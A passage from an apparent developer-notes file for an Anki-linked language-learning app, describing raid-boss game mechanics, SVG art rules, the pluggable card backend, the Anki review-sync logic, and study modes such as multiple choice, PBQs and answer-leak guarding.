    before applyRes) or right after it in `raidStep` (Siphon); none changes a verdict or an Anki grade except that a
    50:50 or Hint is `aided` (struck like a choice, recorded Hard; titled `lg_strikeAided`, refunded like a choice).
    Icons: `public/assets/legends/powers/<id>.svg` (`/dev/raid-powers/`); animations: `impact/PowerFx.jsx` (cast,
    armed, proc, all distinct). A test fight brings every power. Bosses are balanced WITHOUT powers; `powers.test.js`
    caps a power's window damage and keeps later powers stronger; `furycap.test.js` holds the cap WITH all 26 abilities.
    **"Clean" is Focus-aware everywhere** (`hitClean(ctx, res)`, abilities/_rules.js): Fury, Sharpen, Siphon and the
    clean-answer abilities treat a slip under Focus as clean; a glancing slip under Focus brings no attack back.
    **Fury multiplies only the strike's own damage**, never an ability's banked burst. A refund pays the answer's
    `boost` (Fury/Momentum/Focus window that was up) and gives back a Shield spent on it (`strikeCost`/`applyRefund`).
    Help sees the loadout (`powersHelpLine`, off-raid `raidPowersText`). An ability saving damage-split state gets
    `onRally(dayAb, {healed, damage, hp})` (abilities/_contract.js; Chimera uses it). `raidCardIndex` reads "Card 2".
  - Out of questions with boss alive and hearts left: **Continue?** (`raidOutOfQuestions`), next due cards join the
    SAME fight. A win brings the next boss the same day (`RAID.nextBossSameDay`; overkill never spills; one boss per
    run). **Nothing forced after a run** (`raidRunChoices`; owner: a forced aftermath is "weird and insulting unless
    it's a choice"): a win offers Next boss / optional **Victory lap** over unasked cards (reviews + `legends-raid-lap`
    XP) / Done; a loss leaves them due and offers Fight again. "Next boss"/"Fight again" remount (`RaidRun` key).
  - **Every card's FIRST answer is a real review** (`raidRating`, the shared one-answer rule: miss Again, glancing
    Hard, clean Good, clean typed on a mature card (`preRef`) Easy, choice at most Good) via `kit/reviews.js`
    `recordReviews`; inserted and attack answers never. The list is ONE function, `raidReviews`; `raidAttemptOutcome`
    decides the state write; trophy, freeze and `BOSS_BEATEN {raid: true}` pay only after the raid state saved,
    practice XP only for answers Anki recorded. `srs.recordRatings`/`correctRating` are serialized app-wide
    (src/cards/index.js): Study, raids and Ebi Call never drive the reviewer at once.
  - **Test fight** (asset view, cheat mode, `RaidRun test={{ motif }}`): same raid and grading (real reviews, XP,
    level); stored raid state is never read or written. Help gets `raidHelpText`.
  - **Progression is `RAID_ORDER`** (raid.js, the ONE place; `RAID_MOTIFS` = it; `raidBossNumber` = "#N"); a win brings
    the next (`nextBossIndex`, wrapping). **Stored `boss` is an index into the APPEND-ONLY `RAID_ROSTER`** (older
    builds on a share read the same indices): a removed boss is RETIRED (`RAID_RETIRED`, skipped by
    `activeBossIndex`; a stored one moves to the next, keeping wounds), never deleted; its trophies draw as a plain cup
    (`isRaidMotif`, `lg_raidRetired`). Retired: the Glutton (owner disliked the concept; do not recreate).
  - **Raid art**: `public/assets/legends/raids/<motif>.svg`, phase layers `lg-p2`/`lg-p3` (start
    `style="display:none"`), `lg-p1` (phase 1 only), `lg-p12` (gone in phase 3), switched by the arena's `data-phase`.
    Hard rules: each fills its frame, its backdrop is part of it, every phase is a TRANSFORMATION (not a sticker) and
    changes the FACE; no flat colored blobs behind the boss (read as stains). Plan and direction:
    `docs/raid-bosses-plan.md`, `docs/legends-art-guide.md` (read first). Edit the SVGs directly (generator scripts are
    outside the repo). Phase change: `usePhaseShift` (rises only) flashes/shakes (`lgPhaseShift`) and fades "PHASE N"
    UNDER the boss (`lgPhaseTag`; a stamp over it hid the change); focus mode skips it.
  - **Every raid boss needs lore and a voice** (`raidLore.test.js`): `lg_raidLore_<motif>` (2 to 4 sentences, four
    locales) and a `RAID_VOICES` entry. Each has its own card entrance in `ENTRANCES` (names there; a test keeps all
    Legends + raid entrance names distinct).
  - **Photo ophanim (experiment, ophanim only, live)**: `withPhotoEye` (art.jsx PHOTO LAYERS) fills the file's empty
    `lg-photo-*` groups after sanitizing (the file holds no URL), ONE FILE PER CELL: `raids/ophanim/<sprite>-<n>.webp`
    (`PHOTO_CELLS`, `photoCellUrl`, cut from the `raids/ophanim-*.webp` sheets) as plain `<image>`, never a nested
    `<svg viewBox>` window onto a sheet (rendered jumbled and misplaced on Linux); used only if every cell loads
    (`checkPhotoSprites`), else the painted file shows; painted parts it replaces are `lg-photo-hide`. Sky and light are HTML layers (art.jsx PHOTO LIGHT,
    `mix-blend-mode: screen` + `blur`). The great eye is MASKED to an almond (no plate or bezel: owner rejected one).
    Revert = delete both blocks + their uses (loadArt call, `photo` in LegendsArt) + the five webps and `raids/ophanim/`, restore
    `ophanim.svg` from the painted backup (ophanim-backup-before-photo-eye).
- **Raid abilities (v2.1)** (owner: they change how the FIGHT plays, never how a question is asked: no timers, nothing
  hidden, a right answer never marked wrong). ONE module per boss, `abilities/<motif>.js`, whose header comment is the
  spec (mechanic, numbers in `K`, why); hooks contract `_contract.js`, shared limits `_rules.js`; `RAID_ABILITY`
  (raid.js) and `ABILITIES` (fight.js) are built from the modules. Tests per module plus `fairness.test.js` (hint at
  most 8 English words, tag chip at most 3), `balance.test.js` (`_sim.js`), `hooks.test.js`. Ids: hydra `heads`, titan
  `plates`, lich `minions`, chimera `threeheads`, void `horizon`, seraph `verdicts`, leviathan `current`, inferno
  `vent`, chronos `loop`, vampire `wards`, tempest `drums`, kaleido `prism`, puppeteer `puppets`, berserker `allin`,
  swarmqueen `wildfire`, gorgon `mirror`, banshee `scream`, reaper `execute`, dreamer `sleep`, moonmaw `moons`, kitsune
  `rally`, ophanim `grace`, ratking `hoard`, sugarqueen `sugarrush`, showman `encore`, cerberus `shackles`.
  - **Every effect is reachable and documented**: `_triggers.js` holds each effect's numbers and whether it is a
    button; `lg_fxWhen_<motif>_<fx>` / `lg_fxDoes_<motif>_<fx>` (four locales) feed the bestiary card (`bestiaryRows`).
    `triggers.test.js` plays each trigger and checks the effect fires (not one step short); `reachability.test.js`
    fails an effect seen in under 25% of typical raids (button effects 40%); `REACH=1` prints the table.
  - **Decision cap**: only `decision: true` modules show buttons (`DECISION_MAX` 5; now chimera, inferno, berserker,
    ratking), enforced in RaidRun, `_sim` and `raidStep`; never on attacks or inserted questions. Inserted questions
    (minions, loops, last stands) share `MAX_INSERTED` per attempt.
  - **Every fx key has its own EFFECT and juice** (`fx/<motif>.jsx`: `effects`, `floaters`, `juice`
    `{size, shake, flash, hitstop, sfx}` via `fx/_juice.js` + `BossArena.useJuice`, `.lgr-<motif>-<key>` body
    reactions), FIXED bright colors, skipped in focus mode, Still bosses and reduced motion; a new question fades what
    plays, a new strike cancels the old, at most 2 flashes a second. `abilityfx.test.js` fails a fired `fx` with no
    effect, floater text or asset-view button.
  - **Plain strike moments are each boss's OWN** (the owner: "make sure all of these hit hard and are unique per raid
    boss"): `strikeFx.js` (pure) names the moment (hit, critical, Sharpen, the boss's strike, a missed attack, a
    block, a Shield save, Second wind via `last.kind: 'wind'` + its own `wn` counter, the knockout);
    `impact/styles.js` (pure data) says how THAT boss plays it: two fixed colors, its own glyph
    (`impact/glyphs.jsx`), parts for hit / crit / strike / ko (`impact/parts.jsx`: CSS + inline SVG in container
    units, deterministic) and body moves (`impact/body.js`: lgBodyHit_/Strike_/KO_ keyframes on the boss box; a
    knockout never fades below 0.2, the result screen keeps the boss in frame). `StrikeFxLayer.jsx` composes them
    (`momentParts`: a white flash on every hit, the strike smaller behind a parry or a shield bubble, bigger with a
    red crack on a heavy blow) and adds the labels. `impact.test.js`: every RAID_ORDER boss has a style, no two
    share a glyph, a strike or a knockout, only known parts/glyphs/moves, fixed hex colors. A new raid boss needs a
    `RAID_IMPACT` entry. Played by the SAME `useJuice` (`moment`, `STRIKE_FX` juice), so every juice limit
    applies; an ability's own fx wins except for the knockout. Raids only, and raids skip the old red hit disc (`lgBossFlash`); ability floaters wrap instead of running past the arena. Contact sheet of all 26:
    `/dev/raid-impact/?moment=hurt` (dev only; `freeze(ms)` in the console). Asset view: "Impact moments" and
    "Powers" buttons under the phase demo.
  - **Every knockout is a themed CINEMATIC** (the owner: "very dramatic", "creative, dramatic, and unique"): 1.6 to
    2.6s, the killing-blow freeze, a build-up, the boss's OWN death (Chronos shatters into sand, the Lich's phylactery
    breaks, the Void becomes a black hole...), a shockwave + debris at the climax, a weighty DEFEATED! plate, then a
    still `KoTag` under the greyed boss. `impact/styles.js` ko spec + `koTiming`, one death part per boss
    (`impact/parts.jsx`), its own ko body move (`impact/body.js`); `impact.test.js` checks length, stages, uniqueness,
    opacity never below 0.25, everything finished at the end. Calm (focus, Still bosses, reduced motion): greyed + tag.
    Review: `/dev/raid-impact/?moment=ko&times=peak` (all 26) and `?arena=<motif>`.
  - **Powers animate in the LOWER HALF of the boss box, never over the face** (the owner: best mix of visibility and
    position; `impact/PowerFx.jsx`): a cast (`power` {id, n}) and a power hit (`proc`) play in BossArena's POWER STAGE
    (`POWER_STAGE` share of the box height, `data-power-stage`; labels must never clip); armed powers are pills in the hearts row (`PowerBadges`: icon in
    its own moving look + pips), Shield rings the hearts, Steadfast shows gold hearts. Nothing power-related renders
    in the boss box (`powerfx.test.js` / the asset view check it). QuizRunner pops the two 50:50 tiles in and slides a
    hint in (`data-quiz-pop`, none under reduced motion).
- **Asset view** (cheat mode only: `AssetView.jsx`, map header ⚡, sidebar entry `assets` via `AssetScreen.jsx`; a
  `navItems` entry may carry `visible({ registry, featureSettings })`): tabs **Legends**, **Raid bosses** (phases via the
  arena's phase CSS, ability card, live arena with "Next phase") and **Ebi drafts** (`public/assets/ebi-drafts/`, the
  current `SHRIMP` Ebi first); every palette; ←/→ step. **File names ONLY there** (and the dev gallery): `ArtLabels`
  puts a tag UNDER drawings of 100px+, never on them, never in gameplay (the owner).
- **Art loads near the screen and pauses off it** (`useArtInView`: comes in within `ART_NEAR` (1) screens, leaves past
  `ART_FAR` (3), measured against the nearest VERTICAL scroller (`scrollRootOf`), never the window: <main> clipped it,
  so art arrived on screen empty and popped in; `sanitizeQueue` one file per task,
  `pauseAnimations` off screen): mounting every raid boss at once lagged the owner's computer. The dev gallery sets
  `window.__ebikiArtEager = true` (check-art needs it); keep that line.
- **Boss figures breathe past their frame** (`BOSS_HEADROOM` 20%): boss SVGs render `overflow="visible"` clipped at
  `inset(-20%)`, so flames/wings aren't sliced flat. **That headroom is real LAYOUT space wherever something sits next
  to a figure** (`room` prop / `headroomPx(size)`: asset view, gallery, intro card, arena, results, raid hall), else
  tags and titles were drawn over (the owner). Banners clip at their own edge; keep their animated parts inside.
- **Run `node dev/legends-gallery/check-art.mjs` (dev server up) before committing ANY art change.** FAILS on a boss
  part moving past frame + headroom and an idle scale/skew that slides instead of pulsing in place; WARNS on banner
  parts cut mid-motion and OVERDRAW (a decorative stroke must END inside the fill it decorates). Travellers and
  deliberate collapses are allowed; lines meant to leave a shape go in `REVIEWED` only after looking. Write edit
  scripts holding regex backslashes with the Write tool (a heredoc turned `\b` into a backspace, `\s` into `s`).
- **SVG pivots**: scale/rotate/skew pivot on local (0,0); a part drawn elsewhere needs
  `style="transform-box:fill-box;transform-origin:center"` (the sanitizer keeps it) or it slides. Flames pivot
  `center bottom`, drips `center top`, flags/capes/sails/hanging banners at the top or pole side, plants at the base.
  Check with measured centre drift, not a pivot-distance threshold. A looping translate ending away from its start
  snaps back: particles get a sibling additive scale `0;1;1;0`, drifters go there and back. Reduced motion and focus
  mode never force `opacity` on SVG (shadows turned solid). An ENTRANCE must END at the file's own pose (the arena
  strips `lg-in`), so wrap a part ending elsewhere in `<g transform="<end pose>">` with values shifted. Two
  NON-additive animateTransforms on one element override each other: the loop gets `additive="sum"`. A part copying
  another's idle loop copies its entrance too. "Hide" by off-canvas jump is instant (step keyTimes), never a slide.
- **Help** can open a map edit: `legends_edit` action (capability text only when `appContext.legendsAvailable`),
  receipts `hr_legends*`, via `featureCtx.open('legends', { edit })` (`useIntent`).
- Drive it with every AI host stubbed and `/api/feature-data` in memory (the real stores and credits untouched).

## Porting to phones (iOS / Android): keep these seams clean
Capacitor (web UI in a WebView) or React Native (UI rebuilt, logic reused). Both need:
- **`src/platform/` is the ONLY door to the device and local server**: `apiFetch(path, init)` for every `/api` call
  (a phone build answers the same paths on-device), `platform.beacon/kv/onPageHide/isHidden/speech/randomId/history`;
  `setPlatform({...})` overrides parts. **Never write `fetch('/api…')` or `sendBeacon('/api…')`**
  (`src/platform/platform.test.js`).
- **Feature logic is platform-neutral** (enforced): plain `.js` in `src/features/**` never touches `window`,
  `document`, `localStorage`, `sessionStorage`, `navigator`, or `fetch` (except outside `https://`). UI in `.jsx`,
  browser-only code in `web.js`, desktop halves in `server.js`. The scan also covers app modules feature logic
  imports (`config/grading.js`, `cards`, `i18n`, `utils/studyDepth.js`, `config/study.js`).
- **Cards**: no AnkiConnect on phones (Android: AnkiDroid API; iOS: own backend from `src/cards/template.js`).
  Features are chosen per platform in `src/features/index.js`.
- **Routes an on-device router must answer**: `config`, `modes`, `modes/knowledge`, `knowledge-sections`,
  `ankiformat`, `deck-progress`, `discover-store`, `question-bank`, `chats`, `chat-load`, `keys`, `players`,
  `player-local`, `feature-data`, `usage`, `log`, `web-search` (CORS-free), `tts`, `anki` (AnkiConnect-like backend
  only). **Desktop-only** ("not available"): `alive`, `bye`, `datadir`, `offline`, `sync-backup`, `update`,
  `launchmode`, `launch-overlay`, `overlay-hide`, `overlay-screenshot`, `game-inbox` (the overlay's XP relay),
  `ankiconnect`, `anki-focus`, `anki-start`.
  Keep this list current when adding a route. Electron, launchers, Alt+Q overlay and the Anki updater are desktop-only.

## Card backend: Anki is swappable (`src/cards/`)
App code reaches cards ONLY through `srs.*` from `src/cards`. `src/cards/anki` (AnkiConnect via `/api/anki`) is one
backend; `contract.js` is the interface (methods, shapes, at-most-once rules); swap with `registerBackend(b)` +
`selectBackend(id)`. Tests: `cards.test.js`.
- **Never import `src/cards/anki` from app code or write Anki search syntax outside it** (enforced: also no
  `/api/anki*` calls, AnkiConnect action names like `gui*`/`setDueDate`/`storeMediaFile`, or its media naming outside
  `src/cards/anki`, `src/cards/index.js` and `server.js` files; `/api/ankiformat` is Ebiki's own file). Queries are
  structured (`{ deck, noteId, cardId, text, ignoreAccents, state: 'due'|'new'|'dueOrNew', excludeSuspended,
  excludeBuried }`) and `compileQuery` builds the string; empty = error.
- **Rating writes are backend-owned** (`recordRatings({deck, ratings, preSchedule, hooks})`,
  `correctRating({cardId, ease, preSchedule})`); App keeps its guards (`studySyncedIdsRef`, `uncertainSyncRef`,
  `preSyncInfoRef`) and passes them as hooks (`recorded` = `markSynced`, `markUncertain`/`clearUncertain`,
  `uncertainSince`/`forgetUncertain`, `notOurs`). `oneStepInterval` (contract.js) = the shared SM-2 step.
- **Optional abilities are capabilities** (`cloudSync`, `files`, `setup`; `hasCapability`); a missing one gets a
  harmless facade default (`readFile`/`storeFile` THROW so blob readers fall back to local). Without `setup`,
  `renderAnkiOfflineBanner` shows `cardStoreOffline` + Refresh instead of the Anki diagnosis.
- The contract also owns error codes (`STORE_DOWN_CODES`, `CHANGE_MAYBE_APPLIED` = may still land, `isStoreDown`),
  blob names (`blobFileName`/`legacyBlobFileName`), the field format (HTML, `[sound:<file>]`). Content safety
  (`sanitizeCardHtml`, `escapeStrayLt`) is backend-agnostic (`html.js`); errors translated via `setTranslator`.
- Deliberately Anki-named: `ankiConnected`, `ankiDeck`, `activeMode.ankiDeck`, i18n text. `ankiAddNote` etc. in this
  file are adapter internals behind `srs.addNote`....
- **A replacement backend** = `src/cards/<id>/index.js` (from `template.js`) with every `REQUIRED_METHODS` entry plus
  its capabilities' optional methods, registered in `src/cards/index.js` in place of Anki, plus a server half only if
  needed. Anki-only leftovers (`/api/anki*` routes, `scripts/*anki*`, setup UI, AnkiWeb banner) are harmless.

## Study → Anki sync
### Driving Anki's real reviewer (`doSyncRatings` → `srs.recordRatings`, in `src/cards/anki`)
Not `answerCards` (throws "not at top of queue" for out-of-order/new cards): `guiDeckReview` → loop
`guiCurrentCard` → `guiShowAnswer` → `guiAnswerCard(ease)` by `cardId`, so Anki computes the interval; cap ease to
`Math.max(...buttons)`; `guiDeckBrowser` at the end. Syncs serialized (`syncChainRef`); **each card answered EXACTLY
ONCE with its FINAL rating** (duplicates once compounded 1d → 3.3y):
1. `studySyncedIdsRef` (written only by `markSynced`, cleared only at session start/exit) filters every sync; the
   `synced` flags are UI-only.
2. Not presented by the reviewer → ask Anki (`cid:X (is:due OR is:new)`); not due = already recorded: `markSynced`,
   skip, drop its `preSyncInfoRef` entry (else a later correction adds a review).
3. Unreachable: NEW → `setDueDate <days>!` + `insertReviews`. REVIEW → bare `setDueDate "0"` nudge (no `!`, keeps the
   interval), then the reviewer; still blocked → one SM-2 step from the card's `interval × factor` (Easy +30%, Hard
   ×1.2, Again 0) via `setDueDate <ivl>!` + `insertReviews`. Once per card per session.
- **The `!` is REQUIRED on recording paths** (it sets the interval); only the nudge omits it.
- **A thrown answer call is never retried in that run** (`uncertain` → `failed`): Anki may have recorded it. Same for
  the fallback's `answerCards` (except "not at top of queue") and the nudge's answer. Every call is `markUncertain`ed
  BEFORE sending and cleared on a definite outcome (`markSynced` / `clearUncertain`), persisted at once
  (`persistSyncGuards`, snapshot `uncertainSync`): a page closed mid-call hid Anki's answer from the restore.
- The uncertain re-check counts only `ease >= 1` rows (the nudge writes button 0); a recorded card locks with ANKI's
  grade. Re-rate, Back, `rateGradedCard` and the feedback re-grade (`fbr_ankiPending`) refuse `uncertainSyncRef`
  cards; `rateGradedCard` also refuses `syncInFlightIdsRef` cards.
- **The fallback and post-lock corrections step from `preSyncInfoRef`** (snapshot `preSyncInfo`); with no schedule
  the fallback THROWS, never assumes interval 1. End Now marks unfinished cards `skipped`, never Again.
- An EXPIRED snapshot with unsynced ratings reopens on its summary. Corrections wait until `syncChainRef` stops
  growing and the card leaves `syncInFlightIdsRef`. A second overturn keeps Anki's grade (`fbr_alreadyCorrected`). A
  failed run backs auto-sync off 60s (`lastSyncFailAtRef`).
- **Stats count ANSWERS**: "Cards Today" = `ankiGetTodayReviewStats` (button ≥ 1; returns its `day`, a read across
  midnight is dropped; null on any failed deck read). A correction's inserted row (`markCorrectionReview`) REPLACES
  the card's earlier outcome. Accuracy skips `relearn` copies; `statFix` skips `noSync`.

### Grace window + lock
- Graded cards auto-sync and **lock** (`🔒 Synced`) `studyAutoSyncMinutes` (default 5) after `gradedAt`. Every trigger
  (timer armed to the oldest deadline, "Sync N now", Finish/Exit, End Now) goes `syncGradedNow()` →
  `syncRatingsToAnki()`. Global `studyAutoSync` OFF = manual/Finish only. Ticker `studyNow` drives "locks in M:SS";
  list behind `studyShowGraded`.
- **A rating can't change under a sync**: `rateGradedCard` refuses synced / `studySyncedIdsRef` cards; a finished sync
  sets rating/ease to what was SENT; Back refuses `syncInFlightIdsRef` cards.
- The auto-sync minutes box commits on blur (`ClampedNumber commitOnBlur`); the timer re-arms on a new grace window.
- **Post-lock correction (`correctSyncedRating`)**: never flip `synced` back (it would never re-sync); add ONE
  follow-up review, one SM-2 step from the pre-sync interval (`preSyncInfoRef`, snapshotted by `doSyncRatings`) via
  `setDueDate '<ivl>!'` + `insertReviews`. Once per card (`cs.ankiCorrected`, "🔒 Synced ✎"), on `syncChainRef`, real
  ease changes only, never noSync/conjugation; MC Good-cap applies. The app appends the factual receipt; **the model
  must never claim it changed Anki**. The merge re-checks `sameCard() && stillGraded()` after every await.

## Study modes
### Grading (shared): ONE rule for one answer (`src/config/grading.js`, `grading.test.js`)
`gradeAnswer({...})` / `gradeFromStrike(verdict, ...)`, `isMature` (≥ 21 days), `gradeIsRight`, `gradeIsSolid`.
Again = wrong / I don't know; Hard = right with a hint, retry or near miss (accent slip, partial, penalizing note,
glancing); Good = clean; Easy = clean, TYPED, no hint, MATURE. A choice never above Good. Subject-neutral. Used by
one-question Study cards, raids (`raidRating`), Legends. Multi-question cards keep the count rule (`rateStudyCard`).

### Question depth (`studyRules.questionDepth`: `'adaptive'` default | `'thorough'`; `utils/studyDepth.js`)
- `questionCountFor`: adaptive gives a due REVIEW (type 2) ONE question; new, learning, relearning, struggling
  (`ADAPTIVE_STRUGGLE_LAPSES`) and relearn copies get `questionsPerCard`; thorough, conjugations and PBQs always do.
- `depthPlan` runs at every card-state creation with `questionsPerCard: 1`: ONE PRODUCTION question (never
  explain/translate), no split-first-card, reuse signature `perCard` keeps 1- and n-question sets apart.
- These cards carry `oneQ` + `ivl`, rated by `oneQuestionRating` (hint = `hintQs`, retry = 2+ attempts, grammar near
  misses only with grammar feedback on). A missed one is re-queued as a noSync relearn copy with the full count
  (`oneQMissNeedsRequeue` / `requeueOneQMiss`). Rules tested in `studyDepth.test.js`; App only wires.
  `DEFAULT_QUESTION_DEPTH` = app default.

### Multiple choice (`studyAnswerStyle` = `'typed' | 'choices'`)
- `ebiki-study-style`; "Record reviews in Anki" (`studyPracticeSync`) defaults CHECKED (`!== '0'`).
- MC questions: 4 options + `answerIdx`, no "explain" questions, NO letter cues. **`buildChoices`** (also Fix
  question): dedupe with the matcher's `norm()`, SHUFFLE (models bias the correct slot), verify against
  `acceptedAnswers` (one match beats a wrong `answerIdx`; two that differ only by accents, "él"/"el", keep the model's
  pick since the accent is the test; two different words → ask typed). Rows without question text are dropped.
- Fully-MC cards grade locally (`evaluateCardLocally`). **Synced MC is capped at Good** (recognition < recall).
  **`noSync` cards are excluded from EVERY sync path** (`!cs.noSync`) and show a PRACTICE badge.
- `submitStudyChoice` advances at once, leaving a frozen `studyChoiceFlash`. Keys 1-4 answer (not while
  `studyDeleteConfirm` is open).

### PBQs (`studyMode = 'pbq'`, GENERAL modes only)
- Matching, ordering, categorize; one per card. `src/pbq/engine.js` (pure): the model authors INDEX-FREE;
  `compilePbq` validates + shuffles; `gradePbq` deterministic; `studentView` strips the key. Categorize rejected when
  one group holds >60% of items; ordering reshuffled until <40% of steps sit in place; a shuffle is never identity.
- **Verification (`generatePbqForCard`)**: relevance gate (`{"kind":"skip"}`, discarded) → generate → compile →
  citations (with a KB: 2-4 VERBATIM quotes, `checkCitations`) → BLIND SOLVE on `studentView` (`compareToKey`) →
  judge (`solver_wrong` keeps the key; `key_wrong`/`ambiguous` → ONE regeneration, then DISCARD). An unusable solve is
  retried once, then dropped (never judged). Up to 3 pool cards per slot (`pbqPullRef`). `strippedPbqOk` rebuilds an
  exercise whose dash strip left an empty or duplicate item.
- `submitPbqAnswer` holds the result (`studyPbqReview`) until Continue. `pbqRatingScore`: 1 easy, ≥.7 good, ≥.4 hard;
  categorize is CHANCE-CORRECTED (dumping all in the biggest group scored a pass). MC's Good-cap/`noSync` apply.
- `itemKey` keeps symbols ("C++" ≠ "C"). `STEP_MARK` strips step numbers (CJK forms too) only when nearly all items
  carry one, never a decimal. Icons (`iconFor`) stay out of `studentView`, ungraded, must not hint.

### Question-style preferences (`studyRules.questionPreferences`, per mode, max 12)
The feedback chat's `question_preference` saves one generalized rule (pinned `feedbackModeId` + `updateModeById`),
injected as a block subordinate to the ambiguity/leak rules. **✎ Fix question** (`fixCurrentQuestion`) regenerates
one live question in place (same type, leak-checked, `glossFetchRef` key deleted so hints refetch) and saves a
preference unless one-off. Hidden for PBQs.

### Slash answers (`expandSlashAnswers`)
The pure study helpers live OUTSIDE App.jsx, tested: `src/utils/answers.js` (slash forms + the typed-answer matcher:
`answerNormalize`, `exactAnswerMatch`, ...), `src/utils/leak.js` (leak guard), `src/utils/letterCue.js` (letter cue);
App imports them. Change them there, never re-inline.
- Endings expand ("niño/a" → niña; `isSlashEnding` also tío/a and plural "/s"); an accented final vowel keeps its
  accent (fatigué/e = fatiguée). Spelled endings live in `SLASH_SPELLED` (heureux/se, acteur/rice, lápiz/ces), each
  tied to its base shape, so a bare "se"/"la"/"ces" never passes. A 3-letter base takes `[aoe]s?` (mío/a/os/as → míos,
  mías); nos/os and tus/os stay two words.
- An article slash replaces the phrase's first word ("el/la estudiante") or, after it, the last ("hace frío/sol"). An
  unslashed article in `GENDERED_ARTICLES` fixes gender ("el médico/a" → el médico only). Endings inside a phrase
  expand word by word, genders aligned; never a phrase starting with a bare ending.
- Beside another slash a plural ending keeps only the singular (else "la jovenes"). Fractions are never split.
  `answerLetterCounts` counts expanded forms.

### Answer-leak guard (question + hint)
`questionAnswerLeak` (exact, accent-insensitive, whole word, ≥3 chars; explanation type and general modes' final deep
question exempt) and `hintRevealsAnswer` (fuzzy). Both REGENERATE first (two rewrites naming the violation);
`scrubAnswerFromQuestion`/`scrubHint` are the last resort, and **a question still leaking after its scrub is DROPPED**.
- `leakNorm` folds apostrophes; answers with non-letters ("aujourd'hui") match as BOUNDED substrings in hints.
- Fix question refuses a scrub that blanked the subject (`blankedSubject`). `letterSkeleton` never builds from a
  Han-first answer.
- `leakAnswers(q)` = accepted + correct choice, but when a distractor is named in the question ("True or false")
  accepted answers that ARE choices are left out (else it shipped blanked).

### Typed-answer feedback (`studyTypedFlash`)
Green ✓ local match; amber ⏳ "Ebi will check" (explanations, general modes, hint-exhausted); red ✗ + shake = wrong
with a hint retry. **The batchFeedback layout-effect gates on every overlay** (`studyChoiceFlash`,
`studyPbqReview`, `studyTypedFlash`, Learn-it) so the last answer's feedback paints. **The shake is TRANSIENT**
(`triggerShake()`, cleared on `onAnimationEnd`; `studyInputShake` only changes the `key`, keying on its truthiness
re-shook every remount).

### "Learn it" moment (`studyLearnMoment`)
I-Don't-Know on Q1 records an honest Again, then `openLearnMoment(cs)` holds the card: back, pronunciation, an auto
memory hook, an Ebi chat (`sendLearnChat`, app language, `knowledgeBlock(4000)` + `dialectRule`).
- **Exit gate = typing it once** (`learnMomentTypedOk`): language = the headword exactly (accents count, any
  "/"-form); general = a short key term (front before the first `:.?!`, improved by a silent AI pick, `keyTermAlt`
  keeps the fallback), forgiving case/spacing/punctuation. No key term = open. Apostrophes and NBSP are folded.
- Slash pieces in the gate share `isSlashEnding`/`expandSlashEnding` with `expandSlashAnswers` (plus
  `expandSlashAnswers([head])`): an ending or single letter never passes alone; a 3+ letter ending must echo the
  base's last two letters ("esta/esa" are two words).
- The give-up dialog SHOWS the front (`study_giveUpCard`): the owner wants to peek, though on a language card it is
  the answer.
- Re-queued ~2 cards ahead as a noSync relearn copy (`requeueForRelearn`), so the Again stays the only Anki review.
  Flashcards only; per mode `studyRules.learnMoment`, default ON, checkbox for all modes.

### Session start, end, adaptive, I don't know
- **Start (`beginStudy`)**: DUE first, then new capped at Anki's `new_count`, each shuffled, only when reviews are
  recorded. One card per NOTE (siblings share fields). Pick only decks that still exist.
- **Split first card** (`questionsPerCard > 1`): Q1 generated alone (`part:'first'`), the rest with Q1 in the prompt
  (`part:'rest'`); card carries `pendingRest` + `expectedCount` until then (done checks skip it). The merge
  (`trackStudyGen`) keeps the on-screen Q1 and reads `studyCardStateRef.current`. Not live-tested with a real deck.
- **End**: End Now sets `studyEndedRef` (pulls stop, grading still lands) and clears `studyLearnMoment` /
  `studyPbqReview` (Help kept describing them). "Clear completed" never drops a card still waiting for Anki.
  `startStudySession` refuses only `ankiConnected === false`.
- **Study completion counts in-flight generations** (`pullsInFlightRef`, `studyPullTick` re-runs completion and
  stall-rescue): pulls and `beginStudy` background cards (`trackStudyGen`), PER SESSION (`exitStudy` zeroes;
  decrement only while `studySessionRef` unchanged). Pulls reserve their pool index from `pbqPullRef` synchronously;
  relearn copies insert relative to it, none during Wrap Up. `gradeFailed` results stay out of accuracy/insights. A
  give-up or skipped conjugation word clears `studyAnswerHistory`.
- **Adaptive** (`studyRules.adaptive`, default OFF, `adaptivePlan`): NEW cards get `learnFirst` (Q1 opens
  `openLearnMoment(cs, { intro: true })`); new and struggling cards are asked MC in a typed session (`adaptiveMc`),
  recorded, capped at Good. Relearn copies untouched.
- **I Don't Know (`skipStudyQuestion`)**: card-level ONLY on Q1 (confirm, all '(skipped)', Again); afterwards it fails
  only the current question, so a correct Q1 isn't forfeited.

### Accent drill
A typed answer CONTAINING a target word with right base letters but wrong accents triggers a retype; the ORIGINAL
answer is then graded unchanged (`cameFromRetype`) and the card capped at Good (`accentSlips`). Canonical = the
variant with the MOST accent marks, in the card's own spelling. **Conjugation drills skip it and match EXACTLY**
(`matchesExact`, `conjugationGradeRule`): an accent can be the tense ("hable"/"hablé"). Conjugation sessions use
non-suspended cards (nothing recorded) in `studyConjugationLanguage`.

### Question chrome and feedback views
- Progress total = completed + active + unpulled (the denominator never moves). **Dots review without destroying**
  (`viewCardQuestion`, never past the frontier); an edited earlier answer hits the EDIT branch of
  `submitStudyAnswer` (replaces `answers[qi]`, returns to the frontier).
- Graded cards: header toggles the body (`card-head`, inner controls `stopPropagation`); `studyGradedView` makes
  Feedback and Help me remember mutually exclusive; question rows via `renderQaRow` (✓ / ✓✎ / ✗).

## Memory hooks (one engine: `generateMemoryHook(front, back, prior, method)`)
Subject-agnostic. Language = `studyRules.hookLanguage` ('' = APP language, not "Ebi speaks": a mnemonic must be
understood instantly), read only via `explainLang`. Improve the prompt in ONE place.
- **`METHODS`**: `meaning` (one vivid image ending at the meaning); `sound` (language: sound-alike bridge from the
  REAL pronunciation, EVERY syllable IN ORDER, recap PAIRWISE `syllable=BRIDGE`; general: acronym/anchor rebuilding
  the term); `parts` (real morphology, ≤60 words); `confuse` (1-2 confusables + a discriminator, ≤50); `story` (≤70).
  Others ≤35. General modes hook the CONCEPT, never a translation. **`auto`** (default) picks a method, bold-prefixed,
  never `confuse`, preferring one unused by prior hooks (fed in; every click APPENDS).
- **Every hook gets a VERIFY-AND-IMPROVE pass** (hooks get memorized; fail-soft, `silent: true`): never a rewrite for
  taste. It may answer ABOUT the draft: wrappers ("Improved version:", fences) are stripped; a verdict, a lost bold
  label or a 2.5x longer reply falls back to the draft.
- Saved hooks hydrate at the START of a generation; completion adds only the new one; a restore clears
